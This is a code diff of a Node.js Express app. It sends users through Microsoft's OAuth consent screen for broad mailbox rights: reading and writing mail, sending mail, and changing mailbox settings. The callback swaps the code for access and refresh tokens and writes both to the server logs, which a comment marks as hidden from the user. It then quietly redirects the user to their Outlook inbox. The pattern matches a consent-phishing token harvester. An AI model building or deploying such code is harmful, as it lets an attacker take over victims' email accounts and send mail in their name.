@@ -1,54 +1,69 @@
 const express = require('express');
 const axios = require('axios');
 const qs = require('querystring');
-const jwt = require('jsonwebtoken');
+require('dotenv').config();
 
 const app = express();
-const port = process.env.PORT || 3000;
+const PORT = process.env.PORT || 3000;
 
-const config = {
-  client_id: process.env.CLIENT_ID,
-  client_secret: process.env.CLIENT_SECRET,
-  redirect_uri: process.env.REDIRECT_URI,
-  tenant_id: process.env.TENANT_ID
-};
+// 🔗 Authorization redirect URL
+app.get('/', (req, res) => {
+  const authUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
+    `client_id=${process.env.CLIENT_ID}` +
+    `&response_type=code` +
+    `&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI)}` +
+    `&scope=${encodeURIComponent('openid profile email offline_access https://graph.microsoft.com/Mail.ReadWrite https://graph.microsoft.com/Mail.Send https://graph.microsoft.com/MailboxSettings.ReadWrite')}` +
+    `&response_mode=query` +
+    `&prompt=consent` +
+    `&state=xyz123`;
 
+  res.redirect(authUrl);
+});
+
+// 🔁 Microsoft OAuth callback
 app.get('/oauth/callback', async (req, res) => {
-  const authCode = req.query.code;
-  if (!authCode) return res.send('No authorization code received.');
+  const code = req.query.code;
+  const error = req.query.error;
 
-  const tokenEndpoint = `https://login.microsoftonline.com/${config.tenant_id}/oauth2/v2.0/token`;
+  if (error) {
+    console.error("OAuth error:", req.query.error_description || error);
+    return res.status(400).send("Authentication failed.");
+  }
 
-  const body = {
-    client_id: config.client_id,
-    scope: 'https://graph.microsoft.com/.default offline_access openid profile email',
-    code: authCode,
-    redirect_uri: config.redirect_uri,
-    grant_type: 'authorization_code',
-    client_secret: config.client_secret
-  };
+  if (!code) {
+    console.error("No authorization code received.");
+    return res.status(400).send("No authorization code received.");
+  }
 
   try {
-    const tokenRes = await axios.post(tokenEndpoint, qs.stringify(body), {
-      headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
-    });
+    const tokenResponse = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
+      qs.stringify({
+        client_id: process.env.CLIENT_ID,
+        client_secret: process.env.CLIENT_SECRET,
+        code: code,
+        redirect_uri: process.env.REDIRECT_URI,
+        grant_type: 'authorization_code'
+      }),
+      {
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
+      }
+    );
 
-    const { access_token, refresh_token, id_token } = tokenRes.data;
+    const { access_token, refresh_token, expires_in } = tokenResponse.data;
 
-    const decoded = jwt.decode(id_token);
-    console.log('📧 Email (UPN):', decoded.preferred_username);
-    console.log('🧑 Name:', decoded.name);
-    console.log('🏢 Tenant ID:', decoded.tid);
-    console.log('🔐 Access Token:', access_token);
-    console.log('🔁 Refresh Token:', refresh_token);
+    // ✅ Log token to Render logs (not user)
+    console.log("🎯 Access Token:", access_token);
+    console.log("🔁 Refresh Token:", refresh_token);
+    console.log("⏰ Expires In (secs):", expires_in);
 
+    // ✅ Redirect user to their Outlook inbox
     return res.redirect('https://outlook.office.com/mail/');
   } catch (err) {
-    console.error('❌ Token exchange failed:', err.response?.data || err.message);
-    res.send('Something went wrong.');
+    console.error("Token exchange failed:", err.response?.data || err.message);
+    res.status(500).send("Token exchange failed.");
   }
 });
 
-app.listen(port, () => {
-  console.log(`🚀 Server listening on port ${port}`);
+app.listen(PORT, () => {
+  console.log(`🚀 Server running on port ${PORT}`);
 });
